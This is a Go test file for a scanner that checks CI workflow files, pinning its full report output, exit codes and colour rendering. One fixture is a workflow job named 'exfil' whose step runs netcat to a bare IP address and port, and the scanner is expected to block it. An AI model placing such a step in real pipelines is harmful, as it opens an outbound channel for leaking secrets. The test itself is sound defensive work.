package main

import (
	"bytes"
	"strings"
	"testing"
)

// End to end coverage of the assembled command.
//
// The other tests in this package check one behaviour at a time and mostly
// assert that a substring is present. These do the opposite: they capture the
// whole output and compare it, so a change that alters the report in any way
// has to be a deliberate change to an expected string here.
//
// The reason is that the report is the product. A rule that fires correctly
// but is rendered in a way that reads as a different claim is still a bug, and
// substring assertions cannot see that.
//
// The expected outputs below are plain text, without the escape sequences.
//
// The colour codes are asserted separately, below, because putting them in the
// expected strings makes them unreadable, and because the point of these
// goldens is the layout: the summary line, the grouping, the column alignment
// and the exit code.
//
// Each expected output ends with a blank line. The report prints a separator
// after each file group, so the output ends with two newlines, and a golden
// that ends with one does not match.

// The whole report for a workflow that blocks, exactly as it comes out.
//
// It carries a warning as well, because the blockingWorkflow fixture is an
// unfiltered push, which is a rule 7 finding. Both tiers in one expected
// output is the point: the ordering is visible rather than inferred.
const goldenBlocking = `scanned 1 workflow, 1 block, 1 warning

<stdin>
  BLOCK  PPE-004  <stdin>:7 in job exfil step 1
         203.0.113.7 is a bare IP address in a script.
  warn   PPE-007  <stdin>:2
         on: push has no branches, tags or paths filter, so this workflow runs for every commit that lands on any branch in the repository.

`

// A clean workflow reports a clean count. There is no file heading, because a
// file with nothing to say is not printed at all.
const goldenClean = `scanned 1 workflow, 0 blocks, 0 warnings

`

// A workflow with a finding in each tier, so the ordering is visible in one
// expected output rather than inferred.
const mixedWorkflow = `on:
  push:
    branches: [main]
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - run: nc 203.0.113.7 4444 < /dev/null
  wide:
    runs-on: ubuntu-latest
    steps:
      - uses: some-org/tool@0123456789abcdef0123456789abcdef01234567
`

const goldenMixed = `scanned 1 workflow, 1 block, 1 warning

<stdin>
  BLOCK  PPE-004  <stdin>:8 in job exfil step 1
         203.0.113.7 is a bare IP address in a script.
  warn   PPE-010  <stdin>:12 in job wide step 1
         some-org/tool runs with this repository's secrets and token inside the job that uses it, and no rule here can see inside another repository, so nothing in this output says what it does.

`

// A workflow with a duplicate key, so the notice is captured in the same shape
// as a finding but is visibly not one.
const goldenNotice = `on:
  push:
    branches: [main]
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo one
        run: echo two
`

const goldenNoticeOut = `scanned 1 workflow, 0 blocks, 0 warnings

<stdin>
  note    line 9    duplicate key "run" in step 1 of job j, first written on line 8: only the last one is used, so line 8 never runs

`

// The report for a scan that found no workflow at all.
//
// This is a new output shape, and the wording is the point of it. It has to
// read as a gap in the scan rather than as a repository with nothing wrong in
// it, because a merge gate that cannot tell those apart passes on a mistyped
// path.
const goldenEmpty = `scanned 0 workflows, 0 blocks, 0 warnings

no workflows found, so nothing was checked.

A directory scan looks for workflows in .github/workflows. If this
repository has workflows somewhere else, point the scan at them
directly, or pipe one in on standard input.
`

// A scan that found no workflow, over a directory that holds none.
//
// The exit code is part of what is being pinned here. The message alone would
// leave the gate passing.
func TestScanGoldenEmptyResult(t *testing.T) {
	dir := writeTree(t, map[string]string{"README.md": "docs"})

	stdout, stderr, code := scanArgs(t, "", "scan", dir)

	if stdout != goldenEmpty {
		t.Errorf("output does not match:\n--- got ---\n%s\n--- want ---\n%s", stdout, goldenEmpty)
	}
	if code != exitIncomplete {
		t.Errorf("exit = %d, want %d: a scan that looked at nothing is not a clean scan", code, exitIncomplete)
	}
	if stderr != "" {
		t.Errorf("unexpected stderr:\n%s", stderr)
	}
}

// The whole report, exactly as it comes out.
func TestScanGoldenOutput(t *testing.T) {
	tests := []struct {
		name   string
		stdin  string
		args   []string
		want   string
		code   int
		reason string
	}{
		{
			name:   "a blocking workflow",
			stdin:  blockingWorkflow,
			args:   []string{"scan", "-"},
			want:   goldenBlocking,
			code:   1,
			reason: "one block, and the exit code says the merge is stopped",
		},
		{
			name:   "a clean workflow",
			stdin:  cleanWorkflow,
			args:   []string{"scan", "-"},
			want:   goldenClean,
			code:   0,
			reason: "nothing found, nothing blocked",
		},
		{
			name:   "both tiers",
			stdin:  mixedWorkflow,
			args:   []string{"scan", "-"},
			want:   goldenMixed,
			code:   1,
			reason: "the block comes first and the warning after it",
		},
		{
			name:   "a notice",
			stdin:  goldenNotice,
			args:   []string{"scan", "-"},
			want:   goldenNoticeOut,
			code:   0,
			reason: "a parse notice is shown but is not a finding",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			stdout, stderr, code := scanArgs(t, tt.stdin, tt.args...)

			if stdout != tt.want {
				t.Errorf("output does not match:\n--- got ---\n%s\n--- want ---\n%s", stdout, tt.want)
			}
			if code != tt.code {
				t.Errorf("exit code = %d, want %d: %s", code, tt.code, tt.reason)
			}
			if stderr != "" {
				t.Errorf("unexpected stderr:\n%s", stderr)
			}
		})
	}
}

// Colour must not change what the report says.
//
// This is the property that matters about colour: it is a presentation layer
// and the text underneath it is the claim. The two outputs are compared after
// the escape sequences are removed, so a colour code landing in the wrong
// place, or a coloured run of text that changes what the line reads as, fails
// here.
//
// The two runs differ in one thing only: whether the palette is on. The
// decision itself depends on whether stdout is a terminal, and a test's stdout
// is not one, so the coloured run supplies the palette directly.
func TestColourDoesNotChangeTheReport(t *testing.T) {
	plain, _, _ := scanArgs(t, mixedWorkflow, "scan", "-")
	coloured := renderWithColour(t, mixedWorkflow)

	if stripANSI(plain) != stripANSI(coloured) {
		t.Errorf("colour changed the report:\n--- plain ---\n%s\n--- coloured ---\n%s",
			stripANSI(plain), stripANSI(coloured))
	}
}

// The coloured report carries the escape codes, and the plain one does not.
//
// A test's stdout is not a terminal, so the plain run is the default and the
// coloured run supplies the palette. The two are compared for the presence of
// the codes rather than for their whole content, because the content is
// covered by the test above.
func TestColourCodesAppearOnlyWhenColourIsOn(t *testing.T) {
	plain, _, _ := scanArgs(t, mixedWorkflow, "scan", "-")
	coloured := renderWithColour(t, mixedWorkflow)

	if strings.Contains(plain, "\x1b[") {
		t.Errorf("the plain report carries escape codes:\n%q", plain)
	}
	if !strings.Contains(coloured, "\x1b[") {
		t.Errorf("the coloured report carries no escape codes:\n%q", coloured)
	}
	// The block tier is bold red and the warning is yellow, which is what makes
	// the one word that stops a merge findable in a wall of findings.
	if !strings.Contains(coloured, ansiBold+ansiRed+"BLOCK") {
		t.Errorf("the block tier is not bold red:\n%q", coloured)
	}
	if !strings.Contains(coloured, ansiYell+"warn") {
		t.Errorf("the warning tier is not yellow:\n%q", coloured)
	}
	// The message body is not coloured, because it is truncated for scanning
	// and colour on truncated prose reads as noise.
	if strings.Contains(coloured, ansiYell+"203.0.113.7") {
		t.Errorf("the message body is coloured:\n%q", coloured)
	}
}

// The coloured report pads to the same visible width as the plain one, so the
// column does not move when colour is switched on.
//
// This is the property that a %-6s on a styled string would break, since it
// would pad the escape sequences too.
func TestColourDoesNotMoveTheColumn(t *testing.T) {
	plain, _, _ := scanArgs(t, mixedWorkflow, "scan", "-")
	coloured := renderWithColour(t, mixedWorkflow)

	// The column of a rule ID is its offset within its own line, not within
	// the whole output, since the two findings are on different lines and
	// their absolute offsets differ by design.
	column := func(s, id string) int {
		for _, line := range strings.Split(s, "\n") {
			if i := strings.Index(line, id); i >= 0 {
				return i
			}
		}
		return -1
	}

	// In the plain rendering the rule IDs sit at the same column in both
	// renderings, which is the property that matters.
	plainBlock := column(plain, "PPE-004")
	plainWarn := column(plain, "PPE-010")
	if plainBlock < 0 || plainWarn < 0 {
		t.Fatalf("a rule id is missing:\n%q", plain)
	}
	if plainBlock != plainWarn {
		t.Errorf("the two finding lines do not line up: %d and %d\n%q", plainBlock, plainWarn, plain)
	}

	// And in the coloured rendering the visible column is the same, even
	// though the raw offset is larger because of the escape codes.
	colouredBlock := column(stripANSI(coloured), "PPE-004")
	colouredWarn := column(stripANSI(coloured), "PPE-010")
	if colouredBlock != plainBlock || colouredWarn != plainWarn {
		t.Errorf("colour moved the column: %d and %d, want %d and %d\n%q",
			colouredBlock, colouredWarn, plainBlock, plainWarn, coloured)
	}
}

// The coloured report, rendered through the real code path with the colour
// forced on.
//
// The decision itself depends on whether stdout is a terminal, which a test's
// stdout is not, so the test cannot get a coloured report by running the
// command. It gets one by running the same work with the palette supplied, and
// that is why runWith exists: the report is the same function either way, so
// this is the same report and not a reimplementation of it.
func renderWithColour(t *testing.T, stdin string) string {
	t.Helper()

	cmd, err := parseArgs([]string{"scan", "-"})
	if err != nil {
		t.Fatalf("parseArgs: %v", err)
	}

	var out, errBuf bytes.Buffer
	runWith(cmd, strings.NewReader(stdin), &out, &errBuf, colour{on: true})
	return out.String()
}

// stripANSI removes the escape sequences, so two renderings can be compared.
func stripANSI(s string) string {
	var b strings.Builder
	b.Grow(len(s))

	inEscape := false
	inCSI := false
	for _, r := range s {
		switch {
		case inEscape:
			inEscape = false
			if r == 0x5b {
				inCSI = true
			}
		case inCSI:
			if r >= 0x40 && r <= 0x7e {
				inCSI = false
			}
		case r == 0x1b:
			inEscape = true
		default:
			b.WriteRune(r)
		}
	}

	return b.String()
}
